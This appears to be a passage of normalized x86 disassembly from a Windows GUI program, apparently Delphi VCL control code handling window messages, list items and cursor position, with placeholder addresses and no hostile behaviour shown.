mov edx 0x2
call sub_403f10
retn
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c1c
mov eax [ ebp - 0xc ]
call sub_4387b4
mov eax ebx
call sub_439250
mov ebx eax
dec edi
mov eax [ eax ]
call sub_439250
mov ebx eax
jmp r-xdata
mov eax [ eax ]
call sub_4392c8
mov ebx eax
jmp r-xdata
sub_439ff0
push ebx
add esp 0xffffffd8
mov ebx eax
mov [ esp + 0x4 ] edx
mov [ esp ] 0x4
mov eax ebx
call sub_439b78
mov edx esp
call sub_429ab4
test eax eax
je r-xdata
xor eax eax
mov eax [ esp + 0x24 ]
jmp r-xdata
add esp 0x28
pop ebx
retn
sub_43a038
push ebx
push esi
mov ebx edx
mov esi eax
push 0x0
mov eax ebx
xor al 0x1
and eax 0x7f
push eax
push 0xb
mov eax esi
call sub_439b78
push eax
call SendMessageA
xor bl 0x1
test bl bl
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
call sub_44db70
sub_43a080
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43a40c
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_418b70
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_439b8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43a0fc
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_43a2c4
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
call sub_41aae4
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_43a1fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403174
retn
sub_43a114
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x20 ]
test edi edi
jne r-xdata
mov eax edi
call sub_439b54
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_439b54
cmp ebx eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_439b54
test eax eax
setg bl
jmp r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_439b54
dec eax
test eax eax
jl r-xdata
mov bl 0x1
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
xor esi esi
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov edx esi
mov eax edi
call sub_439f08
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_439f08
pop edx
call sub_439924
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
sub_43a1a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_418c5c
mov eax [ ebp - 0x8 ]
push eax
push sub_43a1fc
mov eax [ ebp - 0x8 ]
push eax
push sub_43a2c4
push ebp
call sub_43a114
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43a1fc
push ebp
mov ebp esp
add esp 0xfffffed8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_454120
mov [ ebp - 0xd ] al
cmp [ ebp - 0xd ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x1
xor edx edx
push ebp
push sub_43a2b5
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_439b8c
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
call sub_41acf0
mov edi [ ebp - 0xc ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
call sub_43a020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a2bc
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] 0x0
cmp [ ebp - 0xd ] 0x0
je r-xdata
inc edi
retn
mov eax [ ebp - 0x4 ]
call sub_43a06c
xor ecx ecx
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_439c20
mov ebx eax
lea ecx [ ebp - 0x125 ]
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_43994c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx ebx
mov si 0xffac
call sub_403370
dec edi
jne r-xdata
sub_43a2c4
push ebx
push esi
push edi
add esp 0xfffffee4
mov esi edx
mov edi eax
xor eax eax
mov [ esp ] eax
mov eax edi
call sub_439eec
mov ebx eax
test ebx ebx
je r-xdata
mov edx esp
mov ecx 0x4
mov eax esi
call sub_41ad28
mov eax edi
call sub_439eec
mov ebx eax
test ebx ebx
je r-xdata
inc [ esp ]
mov eax ebx
call sub_4390e4
mov ebx eax
test ebx ebx
jne r-xdata
add esp 0x11c
pop edi
pop esi
pop ebx
retn
lea ecx [ esp + 0x4 ]
mov edx esi
mov eax ebx
call sub_439a3c
mov eax ebx
call sub_4390e4
mov ebx eax
test ebx ebx
jne r-xdata
sub_43a334
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi edx
mov ebx eax
mov eax edi
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax edi
call sub_41aac4
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jge r-xdata
cmp eax [ esp ]
pop edx
pop eax
jae r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41acf0
xor esi esi
mov eax ebx
call sub_439eec
mov ebx eax
jmp r-xdata
jmp r-xdata
cmp esi [ esp ]
jge r-xdata
test ebx ebx
jne r-xdata
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax edi
call sub_41acf0
mov dl [ esp + 0x4 ]
mov eax ebx
call sub_438eb0
inc esi
mov eax ebx
call sub_439250
mov ebx eax
sub_43a3b0
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax ebx
call sub_439b54
mov [ esp ] eax
mov edx esp
mov ecx 0x4
mov eax esi
call sub_41ad28
mov eax ebx
call sub_439eec
mov ebx eax
test ebx ebx
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_438ea8
mov [ esp + 0x4 ] al
lea edx [ esp + 0x4 ]
mov ecx 0x1
mov eax esi
call sub_41ad28
mov eax ebx
call sub_439250
mov ebx eax
test ebx ebx
jne r-xdata
sub_43a414
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44fb48
mov eax [ r-xdata ]
not eax
and eax [ ebx + 0x50 ]
or eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov edx 0x79
mov eax ebx
call sub_44cdf0
mov edx 0x61
mov eax ebx
call sub_44ce14
mov dl 0x1
mov eax ebx
call sub_454050
xor edx edx
mov eax ebx
call sub_44d7f8
mov dl 0x1
mov eax [ r-xdata ]
call sub_424360
mov esi eax
mov [ ebx + 0x20c ] esi
mov eax esi
mov edx ebx
call sub_44c210
mov eax ebx
mov edx [ eax ]
call [ edx + 0xcc ]
mov [ ebx + 0x26c ] eax
mov [ ebx + 0x209 ] 0x1
mov [ ebx + 0x258 ] 0x1
mov [ ebx + 0x25a ] 0x1
mov [ ebx + 0x259 ] 0x1
mov [ ebx + 0x22c ] 0x1
push 0x20
mov ecx 0x20
mov dl 0x1
mov eax [ r-xdata ]
call sub_45a650
mov [ ebx + 0x21c ] eax
mov [ ebx + 0x24c ] 0xffffffff
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov [ ebx + 0x278 ] eax
mov [ ebx + 0x274 ] 0x0
mov al [ r-xdata ]
mov [ ebx + 0x275 ] al
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_430ca0
mov esi eax
mov [ ebx + 0x330 ] esi
mov eax esi
xor edx edx
call sub_430e28
mov eax [ ebx + 0x330 ]
xor edx edx
call sub_430e38
push ebx
push sub_43b14c
mov eax [ ebx + 0x330 ]
call sub_430e48
mov [ ebx + 0x290 ] 0x1
mov [ ebx + 0x268 ] 0x1
push ebx
push sub_43aba0
call sub_464c38
mov [ ebx + 0x228 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x230 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43c1d0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov esi eax
mov [ ebx + 0x264 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_43c1d0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_43a5c9
add [ eax ] al
add [ ebx + 0x56 ] dl
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x26c ]
call sub_403174
xor eax eax
mov [ esi + 0x26c ] eax
mov eax [ esi + 0x27c ]
call sub_403174
mov eax [ esi + 0x278 ]
call sub_403174
mov eax [ esi + 0x330 ]
call sub_403174
mov eax [ esi + 0x250 ]
call sub_403174
mov eax [ esi + 0x21c ]
call sub_403174
mov eax [ esi + 0x23c ]
call sub_403174
mov eax [ esi + 0x228 ]
call sub_464c4c
mov eax [ esi + 0x230 ]
call sub_403174
mov eax [ esi + 0x264 ]
call sub_403174
mov eax [ esi + 0x20c ]
call sub_403174
xor eax eax
mov [ esi + 0x20c ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44fc6c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_43a67c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x2
call sub_4370a4
mov edx esi
mov eax ebx
call sub_450ca8
mov ecx r-xdata
mov edx esi
mov eax ebx
call sub_450bd4
mov eax ebx
call sub_44dc78
and eax 0x7f
mov eax [ eax * 4 + rw-data ]
mov edx [ esi + 0x4 ]
xor ecx ecx
mov cl [ ebx + 0x259 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x209 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x25a ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x258 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x246 ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x22c ]
or edx [ ecx * 4 + rw-data ]
xor ecx ecx
mov cl [ ebx + 0x5d ]
or edx [ ecx * 4 + rw-data ]
or eax edx
xor edx edx
mov dl [ ebx + 0x268 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x208 ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x22d ]
or eax [ edx * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x247 ]
or eax [ edx * 4 + rw-data ]
mov [ esi + 0x4 ] eax
cmp [ ebx + 0x1a5 ] 0x0
je r-xdata
and [ esi + 0x24 ] 0xfffffffc
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x209 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_43a79e
add [ eax ] al
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x0
mov eax [ ebp - 0x4 ]
call sub_450dd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x70 ]
call sub_423584
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
pop edx
call sub_429b44
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax [ ebp - 0x4 ]
call sub_453e1c
pop edx
call sub_429b5c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x23c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a020
xor edx edx
push ebp
push sub_43a944
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a1fc
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a334
mov eax [ ebp - 0x4 ]
add eax 0x23c
call sub_40cfec
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x254 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439f08
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b124
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x254 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x234 ]
test ebx ebx
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b074
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439f08
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b1bc
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x260 ]
test ebx ebx
je r-xdata
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x27c
call sub_40cfec
mov eax [ ebp - 0x4 ]
call sub_43cf1c
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_43ca88
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_43b1bc
jmp r-xdata
inc ebx
xor esi esi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
call sub_45a7c8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x234 ]
call sub_45a904
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_43c1a8
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x248 ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
mov edx esi
call sub_4182a8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439f08
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
call sub_41814c
inc esi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
call sub_45a904
mov edx eax
mov ecx 0x2
mov eax [ ebp - 0x4 ]
call sub_43c1a8
sub_43a9d0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x25c ] 0x1
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x290 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43b098
mov edx [ ebp - 0x4 ]
mov [ edx + 0x24c ] eax
mov eax [ ebp - 0x4 ]
call sub_4511b8
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439b54
test eax eax
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a2c4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x23c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a3b0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x23c ]
call sub_41aae4
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x254 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x248 ] edx
mov eax [ ebp - 0x4 ]
call sub_43b0f4
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a020
xor eax eax
push ebp
push sub_43ab79
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x274 ] 0x0
je r-xdata
mov eax ebx
call sub_4392f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x254 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b174
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
cmp [ eax + 0x8 ] 0x1
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_439b8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
call sub_43a06c
retn
mov eax ebx
call sub_4392f8
mov edx [ ebp - 0x4 ]
mov [ edx + 0x248 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403144
mov edx [ ebp - 0x4 ]
mov [ edx + 0x27c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx [ eax ]
call [ edx + 0x8 ]
jmp r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x278 ]
mov edx esi
call sub_4182a8
call sub_4392f8
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x27c ]
call sub_41814c
inc esi
dec ebx
jne r-xdata
sub_43aba0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43ac81
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x105
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x74 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub eax 0x2
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452d58
test al al
je r-xdata
sub eax 0x100
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub eax 0x2
je r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x224 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452c70
test al al
je r-xdata
dec eax
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_452e20
test al al
je r-xdata
sub eax 0x2
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp r-xdata
sub_43aca0
push ebx
mov ebx eax
mov eax ebx
call sub_453350
mov eax [ ebx + 0x70 ]
call sub_423584
push eax
mov eax ebx
call sub_453e1c
pop edx
call sub_429b44
pop ebx
retn
sub_43ace0
push ebx
mov ebx eax
mov eax ebx
call sub_453378
mov eax [ ebx + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423584
push eax
mov eax ebx
call sub_453e1c
pop edx
call sub_429b5c
pop ebx
retn
sub_43ad08
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4534b4
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov [ esi ] 0x15
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_43ad3c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_454120
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
mov eax sub_438748
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ esi + 0x26c ]
call sub_43a40c
mov eax [ esi + 0x26c ]
call sub_439eec
mov edi eax
test edi edi
je r-xdata
mov [ ebp - 0x14 ] 0xffff0000
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax esi
call sub_453e1c
lea edx [ ebp - 0x14 ]
xor ecx ecx
call sub_429b28
cmp eax 0x1
sbb ebx ebx
inc ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax edi
call sub_439008
test al al
je r-xdata
mov eax edi
call sub_4390e4
mov edi eax
test edi edi
jne r-xdata
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_4397c8
sub_43ae60
cmp dl [ eax + 0x25b ]
je r-xdata
retn
mov [ eax + 0x25b ] dl
mov dl [ eax + 0x25b ]
mov ecx edx
sub cl 0x1
je r-xdata
cmp [ eax + 0x2d2 ] 0x0
jne r-xdata
sub cl 0x2
jne r-xdata
mov dl 0x1
call sub_43ad30
add dl 0xfe
sub dl 0x2
jae r-xdata
sub_43aeb0
push ebx
push esi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x5d ]
je r-xdata
mov edx ebx
mov eax esi
call sub_44ca3c
pop esi
pop ebx
retn
test bl bl
sete cl
mov edx 0x10
mov eax esi
call sub_437178
sub_43af4c
push ebx
mov ebx eax
cmp dl [ ebx + 0x22c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x22c ] dl
mov ecx edx
xor cl 0x1
mov eax ebx
mov edx 0x20
call sub_437178
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43af78
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ esp ] edx
mov [ esp + 0x4 ] ecx
mov eax ebx
call sub_453e1c
mov edx esp
call sub_429af8
test eax eax
je r-xdata
xor eax eax
mov edx [ esp + 0xc ]
mov eax [ ebx + 0x26c ]
call sub_439ff0
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_43afb0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov ebx eax
mov si [ r-xdata ]
mov [ esp ] edx
mov [ esp + 0x4 ] edi
mov eax ebx
call sub_453e1c
mov edx esp
call sub_429af8
mov ebx [ esp + 0x8 ]
test bh 0x1
je r-xdata
test bh 0x2
je r-xdata
or si 0x1
test bl 0x1
je r-xdata
or si 0x2
mov eax ebx
and eax 0x46
cmp eax 0x46
jne r-xdata
or si 0x4
test eax eax
je r-xdata
or si 0x8
jmp r-xdata
test bl 0x2
je r-xdata
or si 0x8
test bl 0x10
je r-xdata
test bl 0x4
je r-xdata
or si 0x20
test bl 0x8
je r-xdata
or si 0x10
test bl 0x40
je r-xdata
or si 0x80
test bl 0x20
je r-xdata
or si 0x40
or si 0x200
test bh 0x8
je r-xdata
or si 0x100
test bh 0x4
je r-xdata
or si 0x400
mov eax esi
add esp 0x10
pop edi
pop esi
pop ebx
retn
or si 0x800
sub_43b074
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b098
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_453e1c
mov edx esi
call sub_4299a0
sub_43b0ac
push ebx
mov eax [ eax + 0x26c ]
call sub_439eec
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_438e90
mov eax ebx
call sub_4390e4
mov ebx eax
test ebx ebx
jne r-xdata
sub_43b0f4
push ebx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
call sub_453e1c
call sub_429a20
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_439ff0
pop ebx
retn
sub_43b124
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_453e1c
mov edx [ esi + 0x10 ]
call sub_429aa8
sub_43b174
push ebx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
xor eax eax
cmp [ ebx + 0x244 ] 0x0
je r-xdata
mov eax ebx
call sub_453e1c
call sub_429a48
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_439ff0
pop ebx
retn
cmp [ ebx + 0x240 ] 0x0
je r-xdata
mov eax [ ebx + 0x240 ]
jmp r-xdata
pop ebx
retn
sub_43b1bc
push ebx
mov ebx eax
test edx edx
je r-xdata
mov eax ebx
call sub_453e1c
xor edx edx
call sub_429a90
pop ebx
retn
mov eax edx
mov dl 0x1
call sub_438ee4
pop ebx
retn
sub_43b1f8
push ebx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
xor eax eax
mov eax ebx
call sub_453e1c
call sub_429a58
mov edx eax
mov eax [ ebx + 0x26c ]
call sub_439ff0
test eax eax
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x238 ]
pop ebx
retn
sub_43b230
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_454120
test al al
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov eax ebx
call sub_453e1c
xor edx edx
call sub_429a9c
mov dl 0x1
mov eax esi
call sub_438fc0
jmp r-xdata
sub_43b264
push esi
xor ecx ecx
mov esi [ eax + 0x26c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
test [ edx + 0x8 ] 0x4
je r-xdata
mov edx [ edx + 0x4 ]
mov eax esi
call sub_439ff0
mov ecx eax
mov ecx [ edx + 0x24 ]
jmp r-xdata
sub_43b28c
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x90 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43bc9e
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
cmp eax 0xfffffe6b
jg r-xdata
cmp eax 0xfffffe6f
jg r-xdata
je r-xdata
sub eax 0xfffffff4
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x245 ] 0x0
jne r-xdata
cmp eax 0xfffffe66
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edx eax
mov eax [ ebp - 0x4 ]
mov si 0xffb2
call sub_403370
test al al
jne r-xdata
sub eax 0xfffffe6c
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43bca5
lea eax [ ebp - 0x90 ]
call sub_403eec
retn
mov eax [ ebp - 0x8 ]
lea edx [ ebx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_43b264
mov edi eax
cmp [ ebx + 0xc ] 0x2
jne r-xdata
sub eax 0xfffffe67
je r-xdata
je r-xdata
mov edx [ ebp - 0x8 ]
call sub_4246ac
xor edx edx
push ebp
push sub_43b89a
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
test [ ebx + 0xe ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x240 ] edx
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
